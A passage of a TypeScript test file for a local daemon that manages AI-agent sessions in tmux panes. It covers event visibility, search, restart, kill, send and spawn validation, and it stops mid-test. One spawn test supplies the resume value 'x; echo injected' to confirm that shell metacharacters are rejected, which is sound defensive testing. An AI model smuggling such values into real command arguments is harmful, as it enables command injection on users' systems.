import { describe, it, expect, spyOn, afterAll, mock } from "bun:test";
import {
  DaemonServer,
  rejectCrossOriginBrowser,
  rejectNonLoopbackHost,
  invocationEventToSSE,
} from "./server";
import type { InvocationRecord } from "./invocation-manager";
import { SessionManager } from "./sessions";
import type { SessionEvent } from "./sessions";
import type { SSEEvent, DaemonHealth } from "../types";
import { BUILTIN_AGENTS, type AgentDef } from "../lib/agents";
import type { Session, TmuxPane, EnrichedSession } from "../types/session";
import { AttentionTracker } from "./attention-tracker";
import { InvocationManager } from "./invocation-manager";
import { InvocationRegistry } from "./invokers/registry";
import { stubInvoker } from "./invokers/test-helpers";
import type { HookAdapter } from "./hook-adapter";
import { mkdtempSync, writeFileSync, rmSync } from "fs";
import { tmpdir } from "os";
import { join } from "path";
import type { sendLiteralToPane, sendPromptToPane } from "./pane-io";

/**
 * Access private methods/fields on DaemonServer for unit testing.
 * Avoids starting the HTTP server (no port binding needed).
 */
type ServerInternals = {
  sessionEventToSSE(event: SessionEvent): Promise<SSEEvent | null>;
  enrichSession(session: Session): Promise<EnrichedSession>;
  sweepBranchPRs(): Promise<void>;
  onBranchPRsChanged(cwd: string, branch: string): Promise<void>;
  visibleSessions: Set<string>;
  lastSidebarState: {
    selectedSessionId: string | null;
    selectedHeaderKey: string | null;
  };
  handleGetSessions(
    url: URL,
    headers: Record<string, string>,
  ): Promise<Response>;
  handleSearch(url: URL, headers: Record<string, string>): Promise<Response>;
  handleHealth(headers: Record<string, string>): Response;
  handleRestartSession(
    sessionId: string,
    headers: Record<string, string>,
  ): Promise<Response>;
  handleKillSession(
    sessionId: string,
    headers: Record<string, string>,
  ): Response;
  handleKillAllSessions(headers: Record<string, string>): Response;
  handleSendToSession(
    sessionId: string,
    req: Request,
    headers: Record<string, string>,
  ): Promise<Response>;
  handleScreenSession(
    sessionId: string,
    url: URL,
    headers: Record<string, string>,
  ): Promise<Response>;
  handleActivePaneNotification(
    req: Request,
    headers: Record<string, string>,
  ): Promise<Response>;
  handleSidebarStateUpdate(
    req: Request,
    headers: Record<string, string>,
  ): Promise<Response>;
  handleSpawn(req: Request, headers: Record<string, string>): Promise<Response>;
  handleInvoke(
    req: Request,
    headers: Record<string, string>,
  ): Promise<Response>;
  handleInvokeCancel(
    invocationId: string,
    headers: Record<string, string>,
  ): Promise<Response>;
  handleInvocationResult(
    invocationId: string,
    headers: Record<string, string>,
  ): Promise<Response>;
  resolveSession(id: string): Session | undefined;
  lastActivePaneId: string | null;
  handleNotificationActionRequest(
    req: Request,
    headers: Record<string, string>,
  ): Promise<Response>;
  handleSSE(): Response;
  invocationManager: InvocationManager;
  handleRequest(req: Request): Promise<Response>;
  getServerSocketPath(): Promise<string | null>;
};

function createServer(
  manager?: SessionManager,
  paneCache?: Map<string, TmuxPane>,
  tracker?: AttentionTracker,
  getHookAdapter?: (name: string) => HookAdapter | null,
  agentLookup?: (name: string) => AgentDef | undefined,
  paneSendDeps: {
    sendLiteralToPane: typeof sendLiteralToPane;
    sendPromptToPane: typeof sendPromptToPane;
  } = {
    sendLiteralToPane: mock(async () => true),
    sendPromptToPane: mock(async () => true),
  },
  runNotificationAction?: ConstructorParameters<typeof DaemonServer>[7],
  getScanHealth?: ConstructorParameters<typeof DaemonServer>[9],
) {
  const mgr = manager ?? new SessionManager();
  const cache = paneCache ?? new Map<string, TmuxPane>();
  const attn = tracker ?? new AttentionTracker(5_000);
  const invocationManager = new InvocationManager(
    mgr,
    new InvocationRegistry(
      stubInvoker("claude-interactive"),
      stubInvoker("subprocess"),
    ),
  );
  const resolveHookAdapter = getHookAdapter ?? ((_name: string) => null);
  const resolveAgent =
    agentLookup ??
    ((agentType: string) => BUILTIN_AGENTS.find((a) => a.name === agentType));
  const server = new DaemonServer(
    mgr,
    () => cache,
    resolveAgent,
    attn,
    invocationManager,
    resolveHookAdapter,
    paneSendDeps,
    runNotificationAction ?? null,
    null,
    getScanHealth,
  );
  return {
    manager: mgr,
    server,
    tracker: attn,
    internals: server as unknown as ServerInternals,
  };
}

function fakePane(overrides: Partial<TmuxPane> = {}): TmuxPane {
  return {
    paneId: "%1",
    panePid: 1000,
    sessionName: "main",
    windowIndex: 0,
    paneIndex: 0,
    target: "main:0.0",
    tty: null,
    startTime: null,
    windowActivity: null,
    paneTitle: null,
    currentCommand: null,
    currentPath: null,
    ...overrides,
  };
}

/** Build a minimal Session object for event testing (bypasses SessionManager listeners). */
function fakeSession(id: string, tmuxPane: string | null = null): Session {
  return {
    id,
    agentType: "claude",
    trackingMode: "native",
    nativeSessionId: id,
    project: "proj",
    cwd: "/Users/test/proj",
    logPath: `/Users/test/.claude/projects/-Users-test-proj/${id}.jsonl`,
    status: "idle",
    attentionType: null,
    pendingTool: null,
    inPlanMode: false,
    tmuxPane,
    updatedAt: new Date(),
    lastActivityAt: null,
    lastUserInputAt: null,
    subagents: [],
    gitBranch: null,
    version: null,
    pid: null,
    statusChangedAt: null,
    attentionGeneration: 0,
    previousStatus: null,
    attentionState: null,
    lastSeenAt: null,
    lastPrompt: null,
    prompts: [],
  };
}

describe("DaemonServer", () => {
  describe("sessionEventToSSE visibility tracking", () => {
    it("emits session_created for a paneless NATIVE session (visibly unbound)", async () => {
      const { internals } = createServer();

      const result = await internals.sessionEventToSSE({
        type: "created",
        session: fakeSession("s1"),
      });

      expect(result).not.toBeNull();
      expect(result!.type).toBe("session_created");
      expect(internals.visibleSessions.has("s1")).toBe(true);
    });

    it("suppresses created events for pane-tracked sessions until a pane is assigned", async () => {
      const { internals } = createServer();

      const result = await internals.sessionEventToSSE({
        type: "created",
        session: { ...fakeSession("s1"), trackingMode: "pane", logPath: null },
      });

      expect(result).toBeNull();
    });

    it("should emit session_created for a background session (paneless but visible)", async () => {
      const { internals } = createServer();

      const result = await internals.sessionEventToSSE({
        type: "created",
        session: { ...fakeSession("sup1"), trackingMode: "background" },
      });

      expect(result).not.toBeNull();
      expect(result!.type).toBe("session_created");
      expect(internals.visibleSessions.has("sup1")).toBe(true);
    });

    it("should keep a background session visible on a paneless updated (no demotion)", async () => {
      const { internals } = createServer();
      internals.visibleSessions.add("sup1");

      const result = await internals.sessionEventToSSE({
        type: "updated",
        // tmuxPane=null: a native session here would be demoted to
        // session_removed, but background stays visible.
        session: { ...fakeSession("sup1"), trackingMode: "background" },
      });

      expect(result).not.toBeNull();
      expect(result!.type).toBe("session_updated");
      expect(internals.visibleSessions.has("sup1")).toBe(true);
    });

    it("should promote updated with pane to session_created when not yet visible", async () => {
      const { internals } = createServer();

      const result = await internals.sessionEventToSSE({
        type: "updated",
        session: fakeSession("s1", "%1"),
      });

      expect(result).not.toBeNull();
      expect(result!.type).toBe("session_created");
      expect(internals.visibleSessions.has("s1")).toBe(true);
    });

    it("should emit session_updated for already visible session with pane", async () => {
      const { internals } = createServer();
      internals.visibleSessions.add("s1");

      const result = await internals.sessionEventToSSE({
        type: "updated",
        session: fakeSession("s1", "%1"),
      });

      expect(result).not.toBeNull();
      expect(result!.type).toBe("session_updated");
    });

    it("keeps a NATIVE session visible when it loses its pane (unbound, not gone)", async () => {
      const { internals } = createServer();
      internals.visibleSessions.add("s1");

      const result = await internals.sessionEventToSSE({
        type: "updated",
        session: fakeSession("s1"), // tmuxPane=null, transcript-backed
      });

      expect(result).not.toBeNull();
      expect(result!.type).toBe("session_updated");
      expect(internals.visibleSessions.has("s1")).toBe(true);
    });

    it("demotes a pane-tracked session that loses its pane", async () => {
      const { internals } = createServer();
      internals.visibleSessions.add("s1");

      const result = await internals.sessionEventToSSE({
        type: "updated",
        session: { ...fakeSession("s1"), trackingMode: "pane", logPath: null },
      });

      expect(result).not.toBeNull();
      expect(result!.type).toBe("session_removed");
      expect(internals.visibleSessions.has("s1")).toBe(false);
    });

    it("suppresses updated events for a paneless pane-tracked session never visible", async () => {
      const { internals } = createServer();

      const result = await internals.sessionEventToSSE({
        type: "updated",
        session: { ...fakeSession("s1"), trackingMode: "pane", logPath: null },
      });

      expect(result).toBeNull();
    });

    it("should emit session_removed for visible session on removed event", async () => {
      const { internals } = createServer();
      internals.visibleSessions.add("s1");

      const result = await internals.sessionEventToSSE({
        type: "removed",
        sessionId: "s1",
      });

      expect(result).not.toBeNull();
      expect(result!.type).toBe("session_removed");
      expect(internals.visibleSessions.has("s1")).toBe(false);
    });

    it("should suppress removed event for non-visible session", async () => {
      const { internals } = createServer();

      const result = await internals.sessionEventToSSE({
        type: "removed",
        sessionId: "s1",
      });

      expect(result).toBeNull();
    });
  });

  describe("handleGetSessions", () => {
    it("should filter paneless sessions by default", async () => {
      const { manager, internals } = createServer();
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );
      manager.createSession(
        "s2",
        "/Users/test/.claude/projects/-Users-test-proj/s2.jsonl",
      );
      manager.setTmuxPane("s1", "%1");
      // A pane-tracked session that lost its pane (no transcript to show)
      // is the one shape that stays hidden by default.
      manager.createPaneTrackedSession({
        agentType: "codex",
        paneId: "%9",
        cwd: "/Users/test/proj",
        pid: 42,
      });
      manager.setTmuxPane("codex_pane9", null);

      const url = new URL("http://localhost/sessions");
      const response = await internals.handleGetSessions(url, {});
      const data = (await response.json()) as { sessions: { id: string }[] };

      // Both NATIVE sessions are visible — s2 as a visibly UNBOUND row
      // — while the paneless pane-tracked one is not.
      expect(data.sessions.map((s) => s.id).sort()).toEqual(["s1", "s2"]);
    });

    it("should return all sessions with ?all=true", async () => {
      const { manager, internals } = createServer();
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );
      manager.createSession(
        "s2",
        "/Users/test/.claude/projects/-Users-test-proj/s2.jsonl",
      );
      manager.setTmuxPane("s1", "%1");

      const url = new URL("http://localhost/sessions?all=true");
      const response = await internals.handleGetSessions(url, {});
      const data = (await response.json()) as { sessions: { id: string }[] };

      expect(data.sessions).toHaveLength(2);
    });

    it("surfaces background (paneless) sessions by default (no ?all=true)", async () => {
      const { manager, internals } = createServer();
      manager.createBackgroundSession({
        daemonShort: "sup1",
        pid: 1,
        cwd: "/Users/test/proj",
        logPath: null,
        version: null,
        status: "working",
        attentionType: null,
        pendingTool: null,
        lastPrompt: null,
        lastActivityAt: null,
      });

      const url = new URL("http://localhost/sessions");
      const response = await internals.handleGetSessions(url, {});
      const data = (await response.json()) as {
        sessions: { id: string; trackingMode: string }[];
      };

      expect(data.sessions).toHaveLength(1);
      expect(data.sessions[0].id).toBe("sup1");
      expect(data.sessions[0].trackingMode).toBe("background");
    });
  });

  describe("handleSearch", () => {
    const searchDir = mkdtempSync(join(tmpdir(), "ccmux-server-search-"));
    afterAll(() => rmSync(searchDir, { recursive: true, force: true }));

    function claudeLog(id: string, ...userTexts: string[]): string {
      const logPath = join(searchDir, `${id}.jsonl`);
      const lines = userTexts.map((text, i) => ({
        type: "user",
        uuid: `${id}-u${i}`,
        parentUuid: null,
        timestamp: `2024-01-01T12:0${i}:00Z`,
        message: { role: "user", content: text },
      }));
      writeFileSync(
        logPath,
        lines.map((l) => JSON.stringify(l)).join("\n") + "\n",
      );
      return logPath;
    }

    it("returns per-session snippets from transcript fixtures", async () => {
      const { manager, internals } = createServer();
      const matchLog = claudeLog("hit", "wire up the invoke pipeline");
      const missLog = claudeLog("miss", "totally unrelated content");
      manager.createSession("hit", matchLog);
      manager.createSession("miss", missLog);

      const url = new URL("http://localhost/search?q=invoke%20pipeline");
      const response = await internals.handleSearch(url, {});
      expect(response.status).toBe(200);
      const data = (await response.json()) as {
        query: string;
        results: {
          sessionId: string;
          matches: { role: string; snippet: string }[];
        }[];
      };

      expect(data.query).toBe("invoke pipeline");
      expect(data.results).toHaveLength(1);
      expect(data.results[0].sessionId).toBe("hit");
      expect(data.results[0].matches[0].role).toBe("user");
      expect(data.results[0].matches[0].snippet).toContain("invoke pipeline");
    });

    it("400s on a query shorter than the minimum", async () => {
      const { internals } = createServer();
      const response = await internals.handleSearch(
        new URL("http://localhost/search?q=a"),
        {},
      );
      expect(response.status).toBe(400);
      const data = (await response.json()) as { error: string };
      expect(data.error).toBe("query too short");
    });

    it("omits sessions whose agent has no parseable transcript", async () => {
      const { manager, internals } = createServer();
      // A gemini pane session is visible (has a pane) but unsupported by the
      // transcript searcher, so it never appears in results.
      manager.createPaneTrackedSession({
        agentType: "gemini",
        paneId: "%7",
        cwd: "/Users/test/proj",
        pid: 7,
      });
      manager.setLogPath("gemini_pane7", claudeLog("gem", "invoke pipeline"));

      const url = new URL("http://localhost/search?q=invoke%20pipeline");
      const response = await internals.handleSearch(url, {});
      const data = (await response.json()) as { results: unknown[] };
      expect(data.results).toHaveLength(0);
    });
  });

  describe("sweepBranchPRs", () => {
    it("enriches visible sessions only", async () => {
      const { manager, internals } = createServer();
      manager.createSession(
        "vis",
        "/Users/test/.claude/projects/-Users-test-proj/vis.jsonl",
      );
      // Paneless pane-tracked session: the one shape the sweep skips.
      manager.createPaneTrackedSession({
        agentType: "codex",
        paneId: "%9",
        cwd: "/Users/test/proj",
        pid: 42,
      });
      manager.setTmuxPane("codex_pane9", null);
      internals.visibleSessions.add("vis");

      const seen: string[] = [];
      const spy = spyOn(
        internals as unknown as { enrichSession: (s: Session) => unknown },
        "enrichSession",
      ).mockImplementation((s: Session) => {
        seen.push(s.id);
        return Promise.resolve({} as EnrichedSession);
      });

      await internals.sweepBranchPRs();

      expect(seen).toEqual(["vis"]);
      spy.mockRestore();
    });
  });

  describe("onBranchPRsChanged", () => {
    it("skips sessions whose cwd cannot match before enriching", async () => {
      const { manager, internals } = createServer();
      manager.createSession(
        "match",
        "/Users/test/.claude/projects/-Users-test-proj/match.jsonl",
      );
      manager.createSession(
        "other",
        "/Users/test/.claude/projects/-Users-test-elsewhere/other.jsonl",
      );
      internals.visibleSessions.add("match");
      internals.visibleSessions.add("other");

      const seen: string[] = [];
      const spy = spyOn(
        internals as unknown as { enrichSession: (s: Session) => unknown },
        "enrichSession",
      ).mockImplementation((s: Session) => {
        seen.push(s.id);
        return Promise.resolve({} as EnrichedSession);
      });

      await internals.onBranchPRsChanged("/Users/test/proj", "feat/x");

      // Only the cwd-matching session pays for an enrich; the changed-key
      // handler fires once per key, so this filter is what keeps a cold
      // cache from going sessions × keys.
      expect(seen).toEqual(["match"]);
      spy.mockRestore();
    });
  });

  describe("enrichSession", () => {
    it("should set paneCwd from pane cache currentPath", async () => {
      const paneCache = new Map<string, TmuxPane>();
      paneCache.set("%1", fakePane({ currentPath: "/Users/test/other-dir" }));
      const { internals } = createServer(undefined, paneCache);

      const enriched = await internals.enrichSession(fakeSession("s1", "%1"));

      expect(enriched.paneCwd).toBe("/Users/test/other-dir");
    });

    it("should set paneCwd to null when pane has no currentPath", async () => {
      const paneCache = new Map<string, TmuxPane>();
      paneCache.set("%1", fakePane());
      const { internals } = createServer(undefined, paneCache);

      const enriched = await internals.enrichSession(fakeSession("s1", "%1"));

      expect(enriched.paneCwd).toBeNull();
    });

    it("should set paneCwd to null when session has no pane", async () => {
      const { internals } = createServer();

      const enriched = await internals.enrichSession(fakeSession("s1"));

      expect(enriched.paneCwd).toBeNull();
    });

    it("should fall back to session.gitBranch when live git returns null", async () => {
      const { internals } = createServer();
      const session = fakeSession("s1");
      // cwd doesn't exist so git lookup returns null
      session.cwd = "/nonexistent/path";
      session.gitBranch = "feature/from-log";

      const enriched = await internals.enrichSession(session);

      expect(enriched.gitBranch).toBe("feature/from-log");
    });

    it("should return null gitBranch when both live git and session are null", async () => {
      const { internals } = createServer();
      const session = fakeSession("s1");
      session.cwd = "/nonexistent/path";
      session.gitBranch = null;

      const enriched = await internals.enrichSession(session);

      expect(enriched.gitBranch).toBeNull();
    });
  });

  describe("handleRestartSession", () => {
    it("should return 404 for unknown session", async () => {
      const { internals } = createServer();

      const response = await internals.handleRestartSession("nonexistent", {});
      const data = (await response.json()) as { error: string };

      expect(response.status).toBe(404);
      expect(data.error).toBe("Session not found");
    });

    it("should return 400 for session without tmux pane", async () => {
      const { manager, internals } = createServer();
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );

      const response = await internals.handleRestartSession("s1", {});
      const data = (await response.json()) as { error: string };

      expect(response.status).toBe(400);
      expect(data.error).toBe("Session has no associated tmux pane");
    });

    it("should return 400 for codex session without native session id", async () => {
      const { manager, internals } = createServer();
      manager.createPaneTrackedSession({
        agentType: "codex",
        paneId: "%1",
        cwd: "/Users/test/proj",
        pid: 12345,
      });

      const response = await internals.handleRestartSession("codex_pane1", {});
      const data = (await response.json()) as { error: string };

      expect(response.status).toBe(400);
      expect(data.error).toBe(
        "Session has no native Codex session ID for resume",
      );
    });

    it("returns 409 when the pane is unbound during the kill-wait", async () => {
      // The early guard held before the ≤5s kill-wait, but the binder can unbind
      // the pane mid-wait. The handler must bail, not run `send-keys -t null`.
      const { manager, internals } = createServer();
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );
      manager.setTmuxPane("s1", "%7");
      manager.setPid("s1", 999999); // enters the kill-wait; process.kill is spied

      const killSpy = spyOn(process, "kill").mockImplementation(((
        _pid: number,
        signal?: string | number,
      ) => {
        // Liveness probe (signal 0): simulate the pane being unbound during
        // the wait, then report the process gone so the loop breaks.
        if (signal === 0) {
          manager.setTmuxPane("s1", null);
          const err = new Error("no such process") as NodeJS.ErrnoException;
          err.code = "ESRCH";
          throw err;
        }
        return true; // SIGTERM: pretend it landed
      }) as typeof process.kill);

      try {
        const response = await internals.handleRestartSession("s1", {});
        const data = (await response.json()) as { error: string };
        expect(response.status).toBe(409);
        expect(data.error).toContain("closed during restart");
      } finally {
        killSpy.mockRestore();
      }
    });
  });

  describe("handleHealth", () => {
    it("should report matched and tracked session counts separately", async () => {
      const { manager, internals } = createServer();
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );
      manager.createSession(
        "s2",
        "/Users/test/.claude/projects/-Users-test-proj/s2.jsonl",
      );
      manager.createSession(
        "s3",
        "/Users/test/.claude/projects/-Users-test-proj/s3.jsonl",
      );
      manager.setTmuxPane("s1", "%1");
      manager.setTmuxPane("s2", "%2");
      // Hidden: pane-tracked without a pane (native s3 stays visible as an
      // unbound row).
      manager.createPaneTrackedSession({
        agentType: "codex",
        paneId: "%9",
        cwd: "/Users/test/proj",
        pid: 42,
      });
      manager.setTmuxPane("codex_pane9", null);

      const response = internals.handleHealth({});
      const data = (await response.json()) as {
        sessions: number;
        trackedSessions: number;
      };

      expect(data.sessions).toBe(3);
      expect(data.trackedSessions).toBe(4);
    });
  });

  describe("resolveSession", () => {
    it("should find session by exact ID", () => {
      const { manager, internals } = createServer();
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );

      const session = internals.resolveSession("s1");
      expect(session).toBeDefined();
      expect(session!.id).toBe("s1");
    });

    it("should fall back to pane ID lookup", () => {
      const { manager, internals } = createServer();
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );
      manager.setTmuxPane("s1", "%5");

      const session = internals.resolveSession("%5");
      expect(session).toBeDefined();
      expect(session!.id).toBe("s1");
    });

    it("should return undefined for unknown ID", () => {
      const { internals } = createServer();

      expect(internals.resolveSession("nonexistent")).toBeUndefined();
    });

    it("should prefer exact ID match over pane ID", () => {
      const { manager, internals } = createServer();
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );
      manager.createSession(
        "s2",
        "/Users/test/.claude/projects/-Users-test-proj/s2.jsonl",
      );
      manager.setTmuxPane("s2", "%1");

      // "s1" matches by exact ID, not by pane
      const session = internals.resolveSession("s1");
      expect(session!.id).toBe("s1");
    });
  });

  describe("handleKillSession", () => {
    it("should return 404 for unknown session", async () => {
      const { internals } = createServer();

      const response = internals.handleKillSession("nonexistent", {});
      const data = (await response.json()) as { error: string };

      expect(response.status).toBe(404);
      expect(data.error).toBe("Session not found");
    });

    it("should return 400 for session without PID", async () => {
      const { manager, internals } = createServer();
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );

      const response = internals.handleKillSession("s1", {});
      const data = (await response.json()) as { error: string };

      expect(response.status).toBe(400);
      expect(data.error).toBe("Session has no associated process");
    });

    it("should refuse a background (read-only) session with 400", async () => {
      const { manager, internals } = createServer();
      // Worker pid is supervisor-owned; ccmux must not SIGTERM it.
      manager.createBackgroundSession({
        daemonShort: "sup-k",
        pid: 424242,
        cwd: "/private/tmp",
        logPath: null,
        version: null,
        status: "working",
        attentionType: null,
        pendingTool: null,
        lastPrompt: null,
        lastActivityAt: null,
      });

      const response = internals.handleKillSession("sup-k", {});
      const data = (await response.json()) as { error: string };

      expect(response.status).toBe(400);
      expect(data.error).toContain("read-only");
    });
  });

  describe("handleSendToSession", () => {
    it("should return 404 for unknown session", async () => {
      const { internals } = createServer();
      const req = new Request("http://localhost/sessions/x/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text: "hello" }),
      });

      const response = await internals.handleSendToSession(
        "nonexistent",
        req,
        {},
      );
      const data = (await response.json()) as { error: string };

      expect(response.status).toBe(404);
      expect(data.error).toBe("Session not found");
    });

    it("should return 400 for session without pane", async () => {
      const { manager, internals } = createServer();
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );

      const req = new Request("http://localhost/sessions/s1/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text: "hello" }),
      });

      const response = await internals.handleSendToSession("s1", req, {});
      const data = (await response.json()) as { error: string };

      expect(response.status).toBe(400);
      expect(data.error).toBe("Session has no associated tmux pane");
    });

    it("should return 400 for invalid JSON body", async () => {
      const { manager, internals } = createServer();
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );
      manager.setTmuxPane("s1", "%1");

      const req = new Request("http://localhost/sessions/s1/send", {
        method: "POST",
        body: "not json",
      });

      const response = await internals.handleSendToSession("s1", req, {});
      const data = (await response.json()) as { error: string };

      expect(response.status).toBe(400);
      expect(data.error).toBe("Invalid JSON body");
    });

    it("should return 400 for missing text field", async () => {
      const { manager, internals } = createServer();
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );
      manager.setTmuxPane("s1", "%1");

      const req = new Request("http://localhost/sessions/s1/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({}),
      });

      const response = await internals.handleSendToSession("s1", req, {});
      const data = (await response.json()) as { error: string };

      expect(response.status).toBe(400);
      expect(data.error).toBe("Missing or invalid 'text' field");
    });

    it("should return 400 for text exceeding max length", async () => {
      const { manager, internals } = createServer();
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );
      manager.setTmuxPane("s1", "%1");

      const req = new Request("http://localhost/sessions/s1/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text: "x".repeat(10_001) }),
      });

      const response = await internals.handleSendToSession("s1", req, {});
      const data = (await response.json()) as { error: string };

      expect(response.status).toBe(400);
      expect(data.error).toBe(
        "Text exceeds maximum length of 10,000 characters",
      );
    });

    it("routes single-line text through literal delivery with enter threading", async () => {
      const paneSendDeps = {
        sendLiteralToPane: mock(async () => true),
        sendPromptToPane: mock(async () => true),
      };
      const { manager, internals } = createServer(
        undefined,
        undefined,
        undefined,
        undefined,
        undefined,
        paneSendDeps,
      );
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );
      manager.setTmuxPane("s1", "%1");

      const response = await internals.handleSendToSession(
        "s1",
        new Request("http://localhost/sessions/s1/send", {
          method: "POST",
          body: JSON.stringify({ text: "hello", enter: false }),
        }),
        {},
      );

      expect(response.status).toBe(200);
      expect(paneSendDeps.sendLiteralToPane).toHaveBeenCalledWith(
        "%1",
        "hello",
        false,
      );
      expect(paneSendDeps.sendPromptToPane).not.toHaveBeenCalled();
    });

    it("routes multiline text through bracketed-paste delivery with enter threading", async () => {
      const paneSendDeps = {
        sendLiteralToPane: mock(async () => true),
        sendPromptToPane: mock(async () => true),
      };
      const { manager, internals } = createServer(
        undefined,
        undefined,
        undefined,
        undefined,
        undefined,
        paneSendDeps,
      );
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );
      manager.setTmuxPane("s1", "%1");

      const response = await internals.handleSendToSession(
        "s1",
        new Request("http://localhost/sessions/s1/send", {
          method: "POST",
          body: JSON.stringify({ text: "line one\nline two", enter: false }),
        }),
        {},
      );

      expect(response.status).toBe(200);
      expect(paneSendDeps.sendPromptToPane).toHaveBeenCalledWith(
        "%1",
        "line one\nline two",
        false,
      );
      expect(paneSendDeps.sendLiteralToPane).not.toHaveBeenCalled();
    });

    it("returns 500 when pane delivery fails", async () => {
      const paneSendDeps = {
        sendLiteralToPane: mock(async () => false),
        sendPromptToPane: mock(async () => true),
      };
      const { manager, internals } = createServer(
        undefined,
        undefined,
        undefined,
        undefined,
        undefined,
        paneSendDeps,
      );
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );
      manager.setTmuxPane("s1", "%1");

      const response = await internals.handleSendToSession(
        "s1",
        new Request("http://localhost/sessions/s1/send", {
          method: "POST",
          body: JSON.stringify({ text: "hello" }),
        }),
        {},
      );

      expect(response.status).toBe(500);
      expect(await response.json()).toEqual({
        error: "Failed to send to session",
      });
    });
  });

  describe("handleSpawn", () => {
    it("should return 400 for invalid JSON body", async () => {
      const { internals } = createServer();
      const req = new Request("http://localhost/spawn", {
        method: "POST",
        body: "not json",
      });

      const response = await internals.handleSpawn(req, {});
      const data = (await response.json()) as { error: string };

      expect(response.status).toBe(400);
      expect(data.error).toBe("Invalid JSON body");
    });

    it("should return 400 for missing cwd", async () => {
      const { internals } = createServer();
      const req = new Request("http://localhost/spawn", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ agent: "claude" }),
      });

      const response = await internals.handleSpawn(req, {});
      const data = (await response.json()) as { error: string };

      expect(response.status).toBe(400);
      expect(data.error).toBe("Missing or invalid 'cwd' field");
    });

    it("should return 400 for non-existent cwd", async () => {
      const { internals } = createServer();
      const req = new Request("http://localhost/spawn", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ agent: "claude", cwd: "/nonexistent/path" }),
      });

      const response = await internals.handleSpawn(req, {});
      const data = (await response.json()) as { error: string };

      expect(response.status).toBe(400);
      expect(data.error).toBe("Directory does not exist: /nonexistent/path");
    });

    it("should return 400 for cwd that is a file, not a directory", async () => {
      const { internals } = createServer();
      const req = new Request("http://localhost/spawn", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ agent: "claude", cwd: "/etc/hosts" }),
      });

      const response = await internals.handleSpawn(req, {});
      const data = (await response.json()) as { error: string };

      expect(response.status).toBe(400);
      expect(data.error).toBe("Not a directory: /etc/hosts");
    });

    it("should return 400 for a resume value with shell metacharacters", async () => {
      const { internals } = createServer();
      const req = new Request("http://localhost/spawn", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          cwd: "/nonexistent-ccmux-test-dir",
          resume: "x; echo injected",
        }),
      });

      const response = await internals.handleSpawn(req, {});
      const data = (await response.json()) as { error: string };

      expect(response.status).toBe(400);
      expect(data.error).toBe("Invalid 'resume' field");
    });

    it("should return 400 for unknown agent", async () => {
      const { internals } = createServer();
      const req = new Request("http://localhost/spawn", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ agent: "foobar", cwd: "/tmp" }),
      });

      const response = await internals.handleSpawn(req, {});
      const data = (await response.json()) as { error: string };

      expect(response.status).toBe(400);
      expect(data.error).toBe("Unknown agent: foobar");
    });

    it("should default agent to claude when not specified", async () => {
      const { internals } = createServer();
      const req = new Request("http://localhost/spawn", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cwd: "/tmp" }),
      });

      // Mock Bun.spawn to prevent actually creating a tmux window
      const originalBunSpawn = Bun.spawn;
      Bun.spawn = ((..._args: unknown[]) => ({
        exited: Promise.resolve(0),
        stdout: new Blob(["%99\n"]).stream(),
        stderr: new Blob([""]).stream(),
      })) as unknown as typeof Bun.spawn;

      try {
        const response = await internals.handleSpawn(req, {});
        // Passes input validation (no 400), agent defaults to claude
        expect(response.status).not.toBe(400);
      } finally {
        Bun.spawn = originalBunSpawn;
      }
    });
  });

  describe("handleScreenSession", () => {
    it("should return 404 for unknown session", async () => {
      const { internals } = createServer();
      const url = new URL("http://localhost/sessions/x/screen");

      const response = await internals.handleScreenSession(
        "nonexistent",
        url,
        {},
      );
      const data = (await response.json()) as { error: string };

      expect(response.status).toBe(404);
      expect(data.error).toBe("Session not found");
    });

    it("should return 400 for session without pane", async () => {
      const { manager, internals } = createServer();
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );

      const url = new URL("http://localhost/sessions/s1/screen");

      const response = await internals.handleScreenSession("s1", url, {});
      const data = (await response.json()) as { error: string };

      expect(response.status).toBe(400);
      expect(data.error).toBe("Session has no associated tmux pane");
    });

    it("should default to 50 lines when param is missing", async () => {
      const { manager, internals } = createServer();
      manager.createSession(
        "s1",
        "/Users/test/.claude/projects/-Users-test-proj/s1.jsonl",
      );
      manager.setTmuxPane("s1", "%1");

      const url = new URL("http://localhost/sessions/s1/screen");

      const response = await internals.handleScreenSession("s1", url, {});
      const data = (await response.json()) as { lines: number };

